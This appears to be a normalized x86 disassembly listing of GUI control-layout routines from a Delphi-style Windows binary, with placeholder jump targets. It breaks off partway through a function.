call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403324
sub_44afe0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b000
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b020
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b040
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b060
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b080
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44b0a0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421188
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4485d8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403324
sub_44b0d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b174
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418df8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_455d30
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_455f18
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_455bc8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_456038
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b17b
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_44b184
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_44b1c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_44b184
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44b270
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4032b4
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44b2a4
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44b2c4
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax edi
call sub_44b304
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_44b330
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44b35c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406b7c
mov eax esp
call sub_417114
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_448af0
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403324
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403324
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_448b1c
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_417114
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_417088
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_448ac4
sub_44b484
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44b4c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447cc8
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44b4f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44b5f0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_448084
push ebx
push sub_44cf94
call sub_421ddc
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424890
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424a38
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_40348c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4674a4
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f0c
lea eax [ ebx + 0x188 ]
call sub_403eb8
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b5f7
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_44b5f7
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_44b628
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
mov eax edi
call sub_420fd8
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4057b4
mov eax [ edi + 0x178 ]
call sub_403128
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_446c30
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44c2c8
mov eax edi
call sub_44c508
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403128
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44c4cc
mov esi eax
mov edx esi
mov eax edi
call sub_44c334
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44c508
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44815c
test bl bl
jle r-xdata
call sub_421e74
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
sub_44b6f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44b7bc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4188f8
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_44f998
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418700
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41884c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418700
test eax eax
je r-xdata
sub_44b7cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_44b80c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4483c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b813
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
sub_44b813
mov eax [ ebp - 0x4 ]
call sub_44b6f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cecc
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44a198
sub_44b848
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44b863 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44b8d4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fadc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_417088
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44bc55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc5c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44bb6a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44bacd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44bc5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44bc8b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44bd14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44c508
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4185a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_418700
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44b8d4
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44c4cc
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41877c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_418700
mov edx eax
mov ecx ebx
mov eax edi
call sub_44b848
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44be84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44c508
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44c4cc
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44c4cc
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44bed8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44be84
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
